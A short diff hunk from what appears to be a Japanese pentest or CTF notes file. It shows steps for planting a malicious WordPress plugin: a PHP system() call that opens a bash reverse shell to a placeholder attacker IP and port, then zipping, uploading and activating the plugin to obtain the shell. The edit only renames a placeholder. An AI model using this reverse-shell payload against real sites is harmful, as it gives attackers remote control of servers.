@@ -138,7 +138,7 @@ system("bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'");
 
 3. zip化する
 ```zsh
-zip <output_name> <filename>
+zip <output_name> <file>
 ```
 
 4. アップロード→Activate Pluginし、リバースシェルを獲得
